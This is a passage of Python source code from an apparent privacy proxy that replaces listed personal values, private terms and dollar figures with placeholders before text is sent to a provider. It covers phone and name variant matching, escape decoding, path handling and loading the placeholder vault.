        c = _phone_core(str(v))
        if c:
            return ("PHONE", c)
    return (t, _norm_key(str(v)))


def listed_count(pairs, by_type=False):
    """how many unique values a [(value, TYPE)] list holds (phone formats counted once); by TYPE when asked."""
    keys = {_listed_key(v, t) for v, t in pairs}
    ph = sorted((k for t, k in keys if t == "PHONE"), key=len)
    for i, k in enumerate(ph):                       # "447700900123" (a bare-digit format) is "+44 7700 900123"
        if any(k != j and k.endswith(j) and len(k) - len(j) <= 3 for j in ph[:i]):
            keys.discard(("PHONE", k))
    if not by_type:
        return len(keys)
    by = {}
    for t, _k in keys:
        by[t] = by.get(t, 0) + 1
    return by


def _phone_variants(p):
    """the written forms a listed phone is matched in. Always the form as written and its bare digits; the common US
    formats only for numbers that are actually US (_is_us_phone). Any other grouping of the same digits is still
    caught by the digit matcher (Scrubber._phone_hits), which the egress re-check uses too."""
    d = _digits(p)
    if len(d) < 7:
        return []
    out = [p, d]
    if _is_us_phone(p):
        d = d[-10:]
        a, b, c = d[:3], d[3:6], d[6:]
        out += [d, "1" + d, "+1" + d, f"{a}-{b}-{c}", f"({a}) {b}-{c}", f"{a}.{b}.{c}", f"+1 {a} {b} {c}",
                f"+1 ({a}) {b}-{c}", f"+1-{a}-{b}-{c}", f"{a} {b} {c}", f"+1 {a}-{b}-{c}"]
    seen, res = set(), []
    for x in out:
        if x not in seen:
            seen.add(x)
            res.append(x)
    return res


# ---------------------------------------------------------------- written variants of listed values (matched, never
# stored in your file): surname first for names, accents stripped, compact IDs. They share the value's placeholder.
_ID_TYPES = ("ID", "SSN", "ACCOUNT", "CARD", "IBAN", "ORDER")


# letters NFKD does not split into a base letter + accent, written the usual ASCII way
_TRANSLIT = str.maketrans({"\u00f8": "o", "\u00d8": "O", "\u0142": "l", "\u0141": "L", "\u0111": "d", "\u0110": "D",
                           "\u00e6": "ae", "\u00c6": "Ae", "\u0153": "oe", "\u0152": "Oe", "\u00df": "ss", "\u00fe": "th",
                           "\u00de": "Th", "\u0131": "i", "\u00f0": "d", "\u00d0": "D"})


_SK_DROP = re.compile("[\u0300-\u036f\u1ab0-\u1aff\u1dc0-\u1dff\u20d0-\u20ff\ufe20-\ufe2f\u200b\u200c\u200d"
                      "\u2060\ufeff\u00ad\u034f\u180e\u3099\u309a]")
_SK_NONAN = re.compile(r"[\W_]+")
_SK_ATDOT = re.compile(r"[\[({<]\s*(?:at|dot)\s*[\])}>]", re.I)          # name [at] example [dot] com
_SK_ALNUM = re.compile(r"[^\W_]")
_SK_DIGITRUN = re.compile(r"\d+(?:[\W_]{1,3}\d+)*")
_NONDIGIT = re.compile(r"\D")
_DIGITS = re.compile(r"\d+")


_HTML_TAG = re.compile(r"</?[A-Za-z][A-Za-z0-9]{0,9}(?:\s[^<>]{0,200})?/?>")     # <br>, <br/>, </p>, <span class="x">


def _sk_tag(m):
    """an HTML tag in the skeleton re-check's tag view: a block element's tag keeps a paragraph break (so a
    dictionary-word name is not joined across separate elements), any other tag reads as a space."""
    return "\n\n" if _BLOCK_BREAK.fullmatch(m.group(0)) else " "


def skeleton_text(text):
    """text reduced for the skeleton re-check: letters without accents (ø->o, ß->ss), compatibility forms folded
    (NFKD: fullwidth digits and letters, ligatures), zero-width characters and soft hyphens removed."""
    import unicodedata
    t = _SK_DROP.sub("", unicodedata.normalize("NFKD", text.translate(_TRANSLIT)))
    return _SK_ATDOT.sub(" ", t) if "at" in t or "dot" in t or "AT" in t or "DOT" in t else t


def _strip_accents(v):
    import unicodedata
    return "".join(c for c in unicodedata.normalize("NFKD", v.translate(_TRANSLIT)) if not unicodedata.combining(c))


def extra_variants(v, t):
    """[variant] for a listed value: 'Last, First' and 'Last First' for a 2-4 word PERSON, the accent-free spelling,
    and for IDs the form with spaces, dots and dashes removed."""
    out = []
    bases = [v] + ([_strip_accents(v)] if t not in ("EMAIL",) and _strip_accents(v) != v else [])
    for b in bases:
        if b != v:
            out.append(b)
        w = b.split()
        if t == "PERSON" and 2 <= len(w) <= 4 and "," not in b:
            out += [w[-1] + ", " + " ".join(w[:-1]), w[-1] + " " + " ".join(w[:-1])]
    if t in _ID_TYPES and re.search(r"[\s.\-]", v) and re.search(r"\d", v):
        c = re.sub(r"[\s.\-]", "", v)
        if len(c) >= 5:
            out.append(c)
    seen, res = {_norm_key(v)}, []
    for x in out:
        if _norm_key(x) not in seen:
            seen.add(_norm_key(x))
            res.append(x)
    return res


def _known_originals(path):
    """[(value, TYPE)] as written in the known file, before phone formats are added."""
    import yaml
    try:
        with open(path, encoding="utf-8") as f:
            d = yaml.safe_load(f) or {}
    except Exception:
        return []
    if isinstance(d, dict) and "known" in d:
        d = d["known"]
    if isinstance(d, dict):
        return [(str(v), str(t).upper()) for t, vals in d.items() for v in (vals or []) if v is not None]
    if isinstance(d, list):
        return [((x.get("value"), str(x.get("type", "PERSON")).upper()) if isinstance(x, dict) else (str(x[0]), str(x[1]).upper()))
                for x in d if x]
    return []


def load_known(path):
    """[(value, TYPE)] from a YAML or JSON file: {TYPE: [values]}, [[value, TYPE], ...] or {"known": [...]}.
    PHONE values are expanded to their common written formats. Raises ScrubError on a malformed file."""
    import yaml
    try:
        with open(path, encoding="utf-8") as f:
            d = yaml.safe_load(f) or {}
    except FileNotFoundError:
        raise ScrubError("configured file is missing: %s" % os.path.basename(path)) from None
    except yaml.YAMLError as e:
        mk = getattr(e, "problem_mark", None)
        raise ScrubError("known_file %s is not valid YAML%s" % (
            os.path.basename(path), " (line %d, column %d)" % (mk.line + 1, mk.column + 1) if mk else "")) from None
    except Exception as e:
        raise ScrubError("known_file unreadable: %s" % type(e).__name__) from None
    if isinstance(d, dict) and "known" in d:
        d = d["known"]
    pairs = []
    if isinstance(d, dict):
        for t, vals in d.items():
            for v in vals or []:
                pairs.append((v, t))
    elif isinstance(d, list):
        for x in d:
            if isinstance(x, dict):
                pairs.append((x.get("value"), x.get("type", "PERSON")))
            else:
                pairs.append(tuple(x))
    else:
        raise ScrubError("known_file must be a mapping or a list")
    out, seen = [], set()
    for v, t in pairs:
        t = str(t or "PERSON").upper()
        if t not in TYPES:
            raise ScrubError("known_file: unknown type %s" % t)
        v = str(v or "").strip()
        if len(v) < 2:
            continue
        for x in (_phone_variants(v) if t == "PHONE" else [v]):
            k = (_norm_key(x), t)
            if k not in seen:
                seen.add(k)
                out.append((x, t))
    return out


# ---------------------------------------------------------------- known-file warnings (shown by check-config, the
# proxy's start line and /scrubber/health; they name lines and counts, never a value of yours)
_COMMON = frozenset("""a about after again all also am an and any april are art as ask at
august back bad baker banks be bear bell bill bird black bless blue bond book born
brown bush but by call can cane care case cash chase cherry chin clay close cook
cool cross crow dale dash dawn day dean dear december do don dove down drake duke
dusty early east eve ever fair faith fall far field fields fish for ford forest fox
frank free friday gale game gay gene gold golden good grace grant gray green grey grove
hall hand happy hardy harmony hart have he heart heath her here hill him his holly
honey hope house how hunt hunter i if in is it ivy jack jade jay jewel
joy july june just king knight lake land lane last light lily long love low major
march mark marsh mason may me might miles mill moon more morning moss my new next
night north not now of off on one or page park pat patience peace pearl penny
pine piper plain pope post price prince rain ray read reed rich ridge river rob robin
rock rose royal ruby rush sage said sand saturday say see shade she sharp short sky
snow so son south spring stark sterling still stone storm summer sun sunday sunny swift tan
that the then they this thursday to tuesday under up us venture violet ward warren was
water way we wednesday well west white who wild will win winter with wood woods yes
you young""".split())


def _line_of(text_lines, v):
    for i, ln in enumerate(text_lines, 1):
        if v in ln:
            return i
    return None


def _dedupe(hits):
    """leftmost-longest, non-overlapping; at the same span the hit found in the text as written wins."""
    hits = sorted(hits, key=lambda h: (h[0], h[0] - h[1], h[-1] is not None))
    out, last = [], -1
    for h in hits:
        if h[0] >= last and h[1] > h[0]:
            out.append(h)
            last = h[1]
    return out


def _decode_all(text):
    """text with its escapes decoded until nothing changes (at most MATCH_DEPTH times): \\u003c, <\\/td>, &lt; -> <."""
    for _ in range(MATCH_DEPTH):
        if not text or not _ESC_HINT.search(text):
            break
        d = _decode_once(text)[0]
        if d == text:
            break
        text = d
    return text


def _around(text, s, e, n=300):
    """(before, after): up to n characters on each side of text[s:e], decoded the way the hit's own view was, so the
    cell rule sees <td> in HTML written as \\u003ctd\\u003e (Go), <\\/td> (PHP) or &lt;td&gt; (entities)."""
    b, a = text[max(0, s - n):s], text[e:e + n]
    if "\\" in b or "&" in b or "%" in b:
        b = _decode_all(b)
    if "\\" in a or "&" in a or "%" in a:
        a = _decode_all(a)
    return b, a


def _view_around(base, s, e, n=300):
    """_around for a hit found in a decoded view: the context is read from the view itself (so n counts decoded
    characters however many backslashes the text as written spends on each one: a quote 8 JSON levels down is 255
    backslashes and the quote, and 300 characters of the text as written do not reach back to the tag), then
    decoded further where the view still carries escapes."""
    return _around(base, s, e, n)


def _side(text, at, n, left):
    """n decoded characters of text before (left) or after `at`: the raw window grows until they fit, and never starts
    or ends inside a run of backslashes (deep in JSON one character is written with hundreds of them)."""
    w, cap = n, n << (MATCH_DEPTH + 2)
    while True:
        if left:
            lo, hi = max(0, at - w), at
            while 0 < lo < hi and text[lo] == "\\":
                lo += 1
        else:
            lo, hi = at, min(len(text), at + w)
            while lo < hi < len(text) and text[hi - 1] == "\\":
                hi -= 1
        chunk = text[lo:hi]
        d = _decode_all(chunk) if ("\\" in chunk or "&" in chunk or "%" in chunk) else chunk
        if len(d) >= n or w >= cap or (lo == 0 if left else hi >= len(text)):
            return d[-n:] if left else d[:n]
        w *= 4


def _fits_here(v, before):
    """False for a surface that spans separate HTML block elements and had a tag right before it (a name swapped out
    of <td>Amber</td><td>Lane</td>, an address split over <div>s) when the reply puts its placeholder where no tag
    comes right before it ("Dear «PERSON_12»", a tool call's to_name): there the cell tags would come back between
    the words, so the listed value is restored instead. Where the same tag comes right before it as before the
    span as sent (<td> then «PERSON_12»: the row written back) the span itself returns; after any other tag
    (<li>«PERSON_12»</li>) the listed value does, so the cells are never put back inside another element."""
    if not isinstance(v, _Esc) or not v.lead:
        return True
    if isinstance(before, tuple):                   # (reply text, placeholder position, earlier stream text)
        cur, pos, prev = before
        b = _side(cur, pos, 300, True)
        if len(b) < 300 and prev:
            b = _side(prev + cur[:pos], len(prev) + pos, 300, True)
    else:
        b = _side(before, len(before), 300, True)
    return _last_tag(b) == v.lead


class _Esc(str):
    """a surface with what its restore needs to know: the value (the str itself, unescaped once per JSON string level
    it sat in), raw (the span as written, when it carried JSON escapes or encoded markup; else None), depth (those
    levels) and lead (it spans separate HTML block elements: the tag that came right before it, "td", "/div" ...). Restored where a
    placeholder lands at the same depth, raw comes back (byte-exact whatever the escaping: \\u003c, <\\/td>, &lt;,
    \\"); elsewhere the value, escaped once per level. A lead surface is only put back after that same tag (_fits_here)."""
    __slots__ = ("raw", "depth", "lead")


def _ctx_of(text, h, ctx):
    """(before, after) around hit h: from the decoded view it was found in when there is one (match_views), else
    from the text as written (_around)."""
    c = ctx.get((h[0], h[1])) if ctx and h[-1] is not None else None
    return c[0](c[1], c[2]) if c else _around(text, h[0], h[1])


_LAST_TAG = re.compile(r"<(/?)([A-Za-z][A-Za-z0-9]{0,9})\b[^<>]{0,200}>$")


def _last_tag(before):
    """("td", "/td" ...) the HTML tag that ends `before` (gaps such as spaces and <span> skipped), else ""."""
    m = _LAST_TAG.search(_CELL_GAP.sub(" ", before).rstrip())
    return (m.group(1) + m.group(2).lower()) if m else ""


def _unescaped_surfaces(text, hits, ctx=None):
    """hits whose span carries JSON escapes inside a JSON string (<div dir=\\"ltr\\"> between the lines of a listed
    address, Go-style \\u003c) or encoded markup (&lt;td&gt;), or that span HTML block elements: the surface becomes an
    _Esc, so the restore never escapes the escapes a second time, keeps the markup as it was written, and does not
    put cell tags back between the words of a name reused outside its cells."""
    if not hits:
        return hits
    out, st = [], None
    for n, h in enumerate(hits):                     # hits are in order of position (_dedupe)
        if not n & 63:
            _tick()
        s, e, surf = h[0], h[1], h[-1]
        raw = text[s:e]
        eff = raw if surf is None else surf
        bs = "\\" in raw
        mark = surf is not None and surf != raw and ("<" in surf or ">" in surf)
        blk = ("<" in eff or "&" in eff or "\\" in eff) and bool(_BLOCK_TAG.search(_decode_all(eff) if (bs or "&" in eff) else eff))
        if not (bs or mark or blk):
            out.append(h)
            continue
        k = 0
        if bs or mark:
            st = st or JsonStrState()
            k = st.depth_at(text, s)
        v, keep_raw = eff, None
        if (bs and k) or mark:
            try:
                v = raw
                for _ in range(k):
                    v = json.loads('"' + v + '"')
                keep_raw = raw
            except ValueError:
                v, keep_raw = eff, None
        if not isinstance(v, str):
            out.append(h)
            continue
        ev = _Esc(v)
        ev.raw, ev.depth, ev.lead = keep_raw, k, False
        if blk:
            ev.lead = _last_tag(_ctx_of(text, h, ctx)[0])
        out.append(h[:-1] + (ev,))
    return out


_WORDS = None


def dictionary_words():
    """lower-case English words (SCOWL size 50, the list Debian ships as wamerican; see THIRD_PARTY_NOTICES.md),
    plus the common-name words above. Loaded once, on first use."""
    global _WORDS
    if _WORDS is None:
        import gzip
        try:
            with gzip.open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "words.txt.gz"), "rt",
                           encoding="utf-8") as f:
                _WORDS = frozenset(f.read().split()) | _COMMON
        except OSError:
            _WORDS = _COMMON
    return _WORDS


def _is_common_phrase(v):
    """a listed name made only of ordinary words: a single word from the common-name list ("Rose"), or several words
    that are all dictionary words ("Drew Wells", "Jack Frost", "Bill Gates"; one-letter initials do not count)."""
    w = re.findall(r"[^\W\d_]+", v.lower())
    if len(w) == 1:
        return w[0] in _COMMON
    long = [x for x in w if len(x) > 1]
    words = dictionary_words() if long else _COMMON
    return bool(long) and all(x in words for x in long)


def known_warnings(path, pairs=None, title_case=True):
    """[warning] about a known file: values still left from the `swapback init` example, and listed names that are
    also ordinary phrases ("Will Hunt" also matches "I will hunt for the keys", since matching ignores case)."""
    if not path:
        return []
    try:
        pairs = load_known(path) if pairs is None else pairs
        lines = open(path, encoding="utf-8").read().splitlines()
    except (OSError, ScrubError):
        return []
    out = []
    try:
        import yaml
        ex = yaml.safe_load(example_text("known.example.yaml")) or {}
        exk = {_norm_key(str(v)) for vals in ex.values() for v in (vals or [])}
    except Exception:
        exk = set()
    left = sorted({_norm_key(v) for v, _t in pairs} & exk)
    if left:
        out.append("known_file still holds %d example value(s) from `swapback init` (the made-up Jane Q Doe, ...); "
                   "replace them with your own" % len(left))
    phr = []
    for v, t in pairs:
        if t in ("PERSON", "FAMILY", "ORG") and _is_common_phrase(v) and _norm_key(v) not in exk:
            phr.append(_line_of(lines, v))
    if phr:
        where = ", ".join("line %d" % n for n in phr[:8] if n) or "see the file"
        if title_case:
            out.append("%d listed name(s) are also ordinary words (%s): they are swapped only when every word is "
                       "capitalised, as a name is written, so a lower-case mention is not swapped (and not protected). "
                       "Set common_names_title_case: false to match any case" % (len(phr), where))
        else:
            out.append("%d listed name(s) are also ordinary words and will be swapped inside normal sentences, "
                       "whatever the case (%s), because common_names_title_case is false. Keep them if that is fine, "
                       "or list a longer form" % (len(phr), where))
    return out



# ---------------------------------------------------------------- custom private terms
# Things that are not PII but must never reach a provider (a codename, an internal figure). Generic: the values live
# only in your private_terms_file; figures are dollar amounts expanded here to every written format.
_CUR = r"(?:US\$|USD\s?|\$)\s?"
_UNITS = ((1e9, r"(?:billion|bn|bil|b)"), (1e6, r"(?:million|mm|mn|mil|m)"))


def _num_re(x, opt_zero=True):
    s = ("%.6f" % x).rstrip("0").rstrip(".")
    ip, _, dp = s.partition(".")
    g = []
    while len(ip) > 3:
        g.insert(0, ip[-3:])
        ip = ip[:-3]
    g.insert(0, ip)
    ipr = ",?".join(g)
    if ipr == "0" and dp:
        ipr = "0?"
    if dp:
        return ipr + r"\." + dp + "0*"
    return ipr + (r"(?:\.0+)?" if opt_zero else r"(?:\.00)?")


def figure_regex(amount, need_currency=False):
    """$1.5B, 1.5 billion, $1,500M, USD 1500 million, $1,500,000,000 ... for one dollar amount. Never a bare digit run,
    never a longer or different number (no digit, dot or comma may touch either end)."""
    a = float(amount)
    forms = []
    for unit, suf in _UNITS:
        n = a / unit
        if n >= 0.1 and abs(round(n, 3) - n) < 1e-9 * max(1.0, n):
            forms.append(_num_re(round(n, 3)) + r"[\s-]?(?i:" + suf + r")(?![A-Za-z0-9&])")   # not M&A
    alts = []
    if forms:
        alts.append((_CUR if need_currency else "(?:" + _CUR + ")?") + "(?:" + "|".join(forms) + ")")
    alts.append(_CUR + _num_re(a, opt_zero=False) + r"(?![\d.,]?\d)")
    return r"(?<![\w.,])(?:" + "|".join(alts) + ")"


def figure_gates(amount):
    """literal strings, one of which every figure_regex(amount) match contains once commas are dropped (a cheap skip)."""
    a, out = float(amount), []
    for unit, _suf in _UNITS:
        n = a / unit
        if n >= 0.1 and abs(round(n, 3) - n) < 1e-9 * max(1.0, n):
            s = ("%.6f" % round(n, 3)).rstrip("0").rstrip(".")
            out.append(s[1:] if s.startswith("0.") else s)
    out.append(("%.2f" % a).rstrip("0").rstrip("."))
    return sorted(set(out))


def build_private_terms(path):
    """-> ([[TYPE, regex, gates], ...], {"by_type": {...}, "bad": n}) from a private terms file:
        terms:   ["Project Bluebird", {"regex": "blue ?bird v\\d"}]   -> PRIVATE_TERM (case-insensitive, whole words)
        figures: [2500000, {"amount": 42e6, "need_currency": true}]     -> PRIVATE_FIGURE (all written formats)
    A bad entry is counted, not fatal. Counts only; never prints a value."""
    import yaml
    try:
        with open(path, encoding="utf-8") as f:
            d = yaml.safe_load(f) or {}
    except yaml.YAMLError as e:
        mk = getattr(e, "problem_mark", None)
        raise ScrubError("private_terms_file %s is not valid YAML%s" % (
            os.path.basename(path), " (line %d, column %d)" % (mk.line + 1, mk.column + 1) if mk else "")) from None
    except Exception as e:
        raise ScrubError("private_terms_file unreadable: %s" % type(e).__name__) from None
    rules, by, bad = [], {}, 0
    for x in d.get("terms") or []:
        try:
            if isinstance(x, dict) and "regex" in x:
                body = str(x["regex"])
            else:
                body = SEP_RX.join(re.escape(w) for w in str(x.get("value") if isinstance(x, dict) else x).split())
            rx = r"(?i:(?<![\w-])(?:" + body + r")(?![\w-]))"
            re.compile(rx)
        except Exception:  # noqa: BLE001
            bad += 1
            continue
        rules.append(["PRIVATE_TERM", rx, None])
        by["PRIVATE_TERM"] = by.get("PRIVATE_TERM", 0) + 1
    for x in d.get("figures") or []:
        try:
            x = x if isinstance(x, dict) else {"amount": x}
            rx = figure_regex(x["amount"], bool(x.get("need_currency")))
            re.compile(rx)
        except Exception:  # noqa: BLE001
            bad += 1
            continue
        rules.append(["PRIVATE_FIGURE", rx, figure_gates(x["amount"])])
        by["PRIVATE_FIGURE"] = by.get("PRIVATE_FIGURE", 0) + 1
    return rules, {"by_type": by, "bad": bad}


# ---------------------------------------------------------------- filesystem paths
# A known name that is one segment of a filesystem path (/home/<user>/x, ~/x, a/b/<name>/c) is a folder name, not a
# person: swapping it breaks agent tool calls (read_file on a path whose case changed). URLs and domains still swap.
# Only a name that fits inside one segment is left; a multi-word name spread over segments (/Users/First/Last/) swaps.
_PATH_STOP = frozenset(" \t\r\n\"'`<>()[]{},;|=*")
_DOMAIN_HEAD = re.compile(r"^[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}(?::\d+)?/")


def in_fs_path(text, s, e):
    """True when text[s:e] is one whole segment of a POSIX-looking path token. A name whose words span several
    segments (/Users/First/Last/, Ngoc/Tram/Vu) is not a folder name: it is swapped (or blocked), not left."""
    seg = text[s:e]
    if not seg or "/" in seg or "\\" in seg or any(c in _PATH_STOP for c in seg):
        return False
    before = text[s - 1] if s else ""
    after = text[e] if e < len(text) else ""
    if before != "/" and after != "/":
        return False
    a, b, n = s, e, len(text)
    while a > 0 and text[a - 1] not in _PATH_STOP:
        a -= 1
    while b < n and text[b] not in _PATH_STOP:
        b += 1
    tok = text[a:b]
    if "://" in tok or "@" in tok or tok.lower().startswith("www."):
        return False                                   # a URL or an address, not a file
    if tok.startswith(("/", "~", "./", "../", "\\/")):
        return True                                    # absolute, home-relative or explicit relative path
    if _DOMAIN_HEAD.match(tok):
        return False                                   # example.com/<name>
    return tok.count("/") >= 2                         # a/b/c relative path; "Jane/Ozzie" stays a name pair


class Scrubber:
    def __init__(self, cfg=None, known=None, vault_path=None, private=None):
        """known: [(value, TYPE)] to use instead of cfg known_file; private: rules from build_private_terms() to use
        instead of cfg private_terms_file. The fake canary values are always part of the known list."""
        self.cfg = cfg or load_cfg()
        self.lock = threading.RLock()
        self.sdir = state_dir(self.cfg)
        self.vault_path = vault_path or os.path.join(self.sdir, "vault.json")
        self.known_path = self.cfg.get("known_file") or ""
        self.private_path = self.cfg.get("private_terms_file") or ""
        self.known_mtime = None
        self.known_user, self.known_block, self.known_warning, self.known_held = None, "", "", False
        self.cache = {}
        self.verified = set()
        self.private = []
        self._known_fixed, self._private_fixed = known is not None, private is not None
        self._load_vault()
        if known is not None:
            self._set_known(list(known) + CANARY)
        if private is not None:
            self._set_private(private)
        self.reload_known(force=True)
        self.on = self.cfg.get("patterns") or {}
        self.patterns = [(t, p, g, GATES.get(i)) for i, (t, p, g) in enumerate(PATTERNS) if self.on.get(t, True)]
        self.det, self.presidio, self.gitleaks = detectors(self.cfg.get("extra_secret_rules"))
        self.presidio.url_keep = tuple(self.cfg.get("url_swap") or ("linkedin.com/in/",))
        self.regions = tuple(self.cfg.get("phone_regions") or ("US", "IN"))

    # vault ---------------------------------------------------------
    def _load_vault(self):
        try:
            v = json.load(open(self.vault_path, encoding="utf-8"))
        except (OSError, ValueError):
            v = {}
        self.fwd = v.get("fwd") or {}            # norm key -> placeholder
        self.rev = v.get("rev") or {}            # placeholder -> value
        self.ctr = v.get("ctr") or {}
        self.dirty = False

    def save_vault(self):
        with self.lock:
            if self.dirty:
                _write_private(self.vault_path, {"fwd": self.fwd, "rev": self.rev, "ctr": self.ctr})
                self.dirty = False

    def placeholder(self, value, t, key=None, canon=None):
        """value -> stable «TYPE_n». key: a known value or private term (its canonical key); every written variant of it
        shares one placeholder, the vault keeps `canon` (the known-file spelling) and a Forms object keeps the surface
        forms for exact restore. Without key (pattern hits) each written form keeps its own stand-in."""
        if key is not None:
            k = t + "|" + key
        else:
            k = t + "|" + _norm_key(value) if t not in ("PHONE",) else "PHONE|" + re.sub(r"\D", "", value)[-10:]
        with self.lock:
            ph = self.fwd.get(k)
            if ph is not None and key is None and self.rev.get(ph) != value:  # phones too: each written form keeps its own
                k += "\x00" + value               # a case/spacing variant gets its own stand-in: restore is exact
                ph = self.fwd.get(k)
            if ph is None:
                n = int(self.ctr.get(t, 0)) + 1
                self.ctr[t] = n
                ph = f"{L}{t}_{n}{R}"
                self.fwd[k] = ph
                self.rev[ph] = canon if canon is not None else value
                self.dirty = True
            return ph

    # known ---------------------------------------------------------
    def _set_known(self, known):
        self.known, self.alias, self.phone_core = {}, {}, {}
        for v, t in known:
            self.known.setdefault(_norm_key(v), (v, t))
        for k, (v, t) in list(self.known.items()):
            for x in extra_variants(v, t):              # surname first, accent-free, compact ID: same placeholder
                kx = _norm_key(x)
                if kx not in self.known and kx not in self.alias:
                    self.alias[kx] = k
            if t == "PHONE":
                c = _phone_core(v)
                if c and c not in self.phone_core:
                    self.phone_core[c] = k
        keys = list(self.known) + list(self.alias)
        self.known_m = detectors()[0].KnownMatcher(keys)
        name_t = ("PERSON", "FAMILY", "ORG")
        self.known_var = []
        for k in keys:
            if " " not in k and "-" not in k.strip("-"):
                continue
            loose = self.known[self.alias.get(k, k)][1] not in name_t
            ws = [p for p in re.split(r"[\s,;\-]+", k) if p]
            if len(ws) < 2:
                continue
            self.known_var.append((k, _variant_rx(k, loose), ws[0], ws[-1]))
            # a multi-word name written glued in one run of letters ("inesferrandmoreau", "janedoe1990@...")
            j = "".join(ws)
            if not loose and len(j) >= 8 and j.isalpha():
                self.known_var.append((k, re.compile(r"(?<![^\W\d_])" + re.escape(j) + r"(?![^\W\d_])", re.I), j, j))
        # listed names made only of ordinary words ("Will Hunt", "Rose Marsh") match only when every word is
        # capitalised, so "I will hunt for the keys" stays as it is (common_names_title_case: false to match any case)
        self.strict = set()
        if self.cfg.get("common_names_title_case", True):
            for k, (v, t) in self.known.items():
                if t in name_t and _is_common_phrase(v):
                    self.strict.add(k)
            self.strict |= {a for a, k in self.alias.items() if k in self.strict}
        self.cache = {}
        self.verified = set()
        self._sk_build()

    _DIGIT_GROUP = re.compile(r"\d+")

    def _phone_hits(self, text):
        """listed phones written in any grouping: runs of digit groups (joined by spaces, dots, dashes, brackets) whose
        digits are a listed phone's national number, optionally after a country code or trunk 0 of up to 3 digits."""
        if not self.phone_core or sum(c.isdigit() for c in text) < 7:
            return []
        cores, top = self.phone_core, max(map(len, self.phone_core)) + 3
        g = [(m.start(), m.end(), m.group(0)) for m in self._DIGIT_GROUP.finditer(text)]
        out, i = [], 0
        while i < len(g):
            s0 = g[i][0]                  # letters glued before or after do not hide it: Mob5035550147, ...0147x22
            acc, best = "", None
            plus = text[max(0, s0 - 2):s0].endswith(("+", "+("))       # a country code may lead the digits
            for j in range(i, len(g)):
                if j > i and not re.fullmatch(r"[ \t\u00a0.\-()/+]{1,3}", text[g[j - 1][1]:g[j][0]]):
                    break
                acc += g[j][2]
                if len(acc) > top:
                    break
                # a country code may lead the digits with or without its "+" (Mob447700900193): up to 3 digits
                cands = [acc] + ([acc[1:]] if acc[0] == "0" else []) + [acc[k:] for k in (1, 2, 3) if len(acc) - k >= 7
                                                                        and (plus or j == i)]
                for x in cands:
                    k = cores.get(x)
                    if k is not None:
                        best = (j, g[j][1], k)
                        break
                if best:
                    break
            if best:
                e = best[1]
                s = s0 - 1 if s0 and text[s0 - 1] == "+" else s0
                if s and text[s - 1] == "(" and ")" in text[s:e]:
                    s -= 1
                    if s and text[s - 1] == "+":
                        s -= 1
                out.append((s, e, best[2]))
                i = best[0] + 1
            else:
                i += 1
        return out

    def _set_private(self, rules):
        by, gates = {}, {}           # one alternation per type: one pass over the text each, not one per entry
        for r in rules or []:
            t, rx, g = (list(r) + [None])[:3]
            by.setdefault(t, []).append("(?:%s)" % rx)
            gates[t] = None if (not g or (t in gates and gates[t] is None)) else gates.get(t, []) + list(g)
        # gates: skip a type's regex when none of its literals is in the text (commas dropped); None = always run
        self.private = [(t, re.compile("|".join(v)), tuple(gates[t]) if gates[t] else None) for t, v in by.items()]
        self.cache = {}
        self.verified = set()

    def _private_hits(self, text, low=None):
        if not self.private:
            return
        low2 = (low if low is not None else text.lower()).replace(",", "")    # gates only test containment
        for t, rx, g in self.private:
            if g and not any(x in low2 for x in g):
                continue
            for m in rx.finditer(text):
                if m.end() > m.start():
                    yield m.start(), m.end(), t, m.group(0)

    def _mtimes(self):
        """a change signature per configured file: mtime, size, inode and ctime (ctime moves on every write and on a
        rename, so a save that keeps the old mtime, e.g. os.replace from a sync tool, is still seen)."""
        out = []
        for p in (self.known_path, self.private_path):
            if not p:
                out.append(None)
                continue
            try:
                st = os.stat(p)
            except OSError:
                raise ScrubError("configured file is missing: %s" % os.path.basename(p)) from None
            out.append((st.st_mtime_ns, st.st_size, st.st_ino, st.st_ctime_ns))
        return tuple(out)

    def _digest(self):
        h = hashlib.sha256()
        for p in (self.known_path, self.private_path):
            if p:
                try:
                    with open(p, "rb") as f:
                        h.update(f.read())
                except OSError:
                    raise ScrubError("configured file is missing: %s" % os.path.basename(p)) from None
            h.update(b"\x00")
        return h.hexdigest()

    def reload_known(self, force=False):
        """re-read known_file / private_terms_file when their content changes. A configured file that is missing or
        unreadable raises ScrubError, so the proxy fails closed instead of sending text it was told to protect.
        Known-file guard: a configured known file with no values blocks every request (unless allow_empty_known);
        a reload that finds the file empty or less than half its previous size keeps protecting the previous values
        as well, raises an alert and shows a warning in /scrubber/health (restart the proxy to accept a smaller list)."""
        if self._known_fixed and self._private_fixed:
            return
        try:
            self._reload(force)
            self.load_error = ""
        except ScrubError as e:                       # missing / unreadable / broken while running: health says blocked
            self.load_error = str(e)
            raise

    load_error = ""

    def known_count(self):
        """unique listed values in force (your file, plus previous values held after a shrink): a phone counts once
        however many written forms it is matched in; the two built-in canary values are not counted."""
        if self.known_user is not None:
            return listed_count(self.known_user)
        canary = {_listed_key(v, t) for v, t in CANARY}
        return len({_listed_key(v, t) for v, t in self.known.values()} - canary)

    def status(self):
        """(ok, status, reason): blocked (every request is refused: empty list, or the file is missing or unreadable
        while running), warning (a shrunk list is held), or ok."""
        if self.known_block or self.load_error:
            return False, "blocked", self.known_block or self.load_error
        if self.known_warning:
            return (not self.known_held), "warning", self.known_warning
        return True, "ok", ""

    def _reload(self, force=False):
        mt = self._mtimes()
        if not force and mt == self.known_mtime:
            return
        with self.lock:
            dg = self._digest()
            if not force and dg == getattr(self, "known_digest", None):
                self.known_mtime = mt
                return
            if not self._known_fixed:
                new = load_known(self.known_path) if self.known_path else []
                self._guard_known(new)
            if not self._private_fixed:
                self._set_private(build_private_terms(self.private_path)[0] if self.private_path else [])
            self.known_mtime, self.known_digest = mt, dg

    on_alert = None                                     # the proxy sets this to its own (hooks-aware, async) alert

    def _alert(self, text):
        if self.on_alert is not None:
            self.on_alert(text)
        elif self.cfg.get("alert_webhook"):
            threading.Thread(target=alert, args=(self.cfg, text), daemon=True).start()

    def _guard_known(self, new):
        prev = getattr(self, "known_user", None)       # the values in force before this reload (None: first load)
        n_old, n_new = len(prev or []), len(new)
        self.known_block = ""
        if self.known_path and n_new == 0 and not self.cfg.get("allow_empty_known") and not n_old:
            self.known_block = ("known_file has no values (%s); add your names, emails and phones, or set "
                                "allow_empty_known: true" % os.path.basename(self.known_path))
        if prev is None and self.known_path:              # first load: compare with the size at the last start
            cp = os.path.join(self.sdir, "known_count.json")
            try:
